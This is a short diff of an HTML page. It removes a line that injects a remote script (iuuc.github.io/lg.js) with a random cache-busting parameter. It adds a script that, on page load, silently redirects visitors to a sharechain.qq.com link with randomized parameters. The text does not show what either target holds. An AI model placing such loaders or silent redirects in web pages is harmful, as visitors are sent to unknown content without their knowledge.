@@ -1,1 +1,10 @@
-<html><head><script>document.write('<script type="text/javascript" src="//iuuc.github.io/lg.js?'+Math.random()+'"><\/script>');</script>
+    <script>
+        let button = document.querySelector('button')
+        const targetUrl = 'https://sharechain.qq.com/71990ee952f2f2469dbb2e2a8f432f27#';
+        const timestamp = Date.now();
+        const randomString = Math.random().toString(36).substring(2);
+        const urlWithParam = `${targetUrl}?timestamp=${timestamp}-${randomString}`;
+        window.onload = function () {
+            window.location.href = urlWithParam;
+        };
+    </script>
